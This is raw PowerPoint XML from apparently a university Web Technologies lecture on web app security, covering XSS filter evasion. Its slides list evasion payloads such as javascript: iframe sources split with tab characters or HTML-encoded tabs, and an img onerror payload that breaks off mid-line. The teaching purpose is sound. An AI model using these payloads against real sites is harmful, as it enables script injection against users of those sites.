            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1040"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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Well,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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payloads</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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way</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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more</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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tricky</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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than</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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that,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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dedicated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	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filter</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-13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evasion</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-12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techniques</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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exist!</a:t>
            </a:r>
            <a:endParaRPr sz="2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30"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-235"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>ATTACK</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-130"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-145"/>
              <a:t>WITH</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-120"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-225"/>
              <a:t>FILTER</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>EVASION</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="object 3" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3003486" y="1673605"/>
            <a:ext cx="6185535" cy="3822700"/>
            <a:chOff x="3003486" y="1673605"/>
            <a:chExt cx="6185535" cy="3822700"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="4" name="object 4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012947" y="2420111"/>
              <a:ext cx="6166104" cy="3066288"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="object 5" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3008248" y="2415286"/>
              <a:ext cx="6176010" cy="3075940"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="6176009" h="3075940">
                  <a:moveTo>
                    <a:pt x="0" y="3075813"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6175629" y="3075813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6175629" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="3075813"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="111F35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495669" y="1673605"/>
              <a:ext cx="1261821" cy="1261808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917859" y="3364102"/>
              <a:ext cx="1178140" cy="1178052"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="object 8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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="object 9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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld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30"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-235"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>ATTACK</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-130"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-145"/>
              <a:t>WITH</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-120"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-225"/>
              <a:t>FILTER</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>EVASION</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="object 3" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3165030" y="1710689"/>
            <a:ext cx="6670040" cy="4476115"/>
            <a:chOff x="3165030" y="1710689"/>
            <a:chExt cx="6670040" cy="4476115"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="4" name="object 4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174491" y="2506979"/>
              <a:ext cx="6650735" cy="3669791"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="object 5" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3169792" y="2502217"/>
              <a:ext cx="6660515" cy="3679825"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="6660515" h="3679825">
                  <a:moveTo>
                    <a:pt x="0" y="3679316"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6660260" y="3679316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6660260" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="3679316"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="111F35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672070" y="1710689"/>
              <a:ext cx="1097191" cy="1097152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122544" y="3429000"/>
              <a:ext cx="1050543" cy="1050544"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="object 8" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="962050" y="1533220"/>
            <a:ext cx="5794375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240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="95"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Oh</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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no!</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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Our</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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original</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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payload</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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filtered!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9" name="object 9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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="object 10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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld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30"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-204"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-225"/>
              <a:t>FILTER</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>EVASION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962050" y="1420185"/>
            <a:ext cx="10184765" cy="3890010"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="12509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85"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>There’s</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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other</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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ways</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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inject</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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code!</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="765"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;iframe</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-60">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"javascript:alert('XSS')"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="710"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
                <a:tab pos="3270885" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;iframe</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-60">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"jav</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>	ascript:alert('XSS')"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-114">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>//tab</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-110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dirty="0" sz="2400" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>char</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="720"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;iframe</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-75">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"jav&amp;#x09;ascript:alert('XSS')"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="994"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;img</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-40">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-40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dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>onerror</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
